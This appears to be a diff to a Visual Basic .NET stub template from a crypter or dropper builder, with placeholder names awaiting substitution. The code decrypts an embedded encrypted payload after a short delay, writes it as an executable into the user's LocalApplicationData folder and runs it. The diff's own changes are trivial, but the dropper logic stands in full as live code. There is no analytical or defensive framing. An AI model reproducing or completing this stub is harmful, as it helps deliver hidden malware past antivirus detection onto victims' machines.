@@ -1,4 +1,4 @@
-﻿Imports System, System.IO, Microsoft.VisualBasic
+﻿Imports System, System.IO, Microsoft.VisualBasic, System.Reflection
 Module ΦM1Φ
 Public Function ΦF1Φ(ByVal input As String, ByVal key As String) As String
         'This function decrypts text that was encrypted with the Polymorphic encrypter in this class.
@@ -31,7 +31,7 @@ Sub Main()
 	Threading.Thread.Sleep(1500)
 	Dim ΦGtmBoiiΦ As String = ΦKSKpPsbΦ
 	Dim ΦThisKeyΦ As String = "ΦJZtSgktΦ"
-	Dim ΦDropStringΦ As String = "ΦDropFileΦ" & ".exe"
+	Dim ΦDropStringΦ As String = ("ΦDropFileΦ" & ".exe")
     File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) & "\" & ΦDropStringΦ, Convert.FromBase64String(ΦF1Φ(ΦGtmBoiiΦ, ΦThisKeyΦ)))
 	System.Diagnostics.Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) & "\" & ΦDropStringΦ)
 End Sub
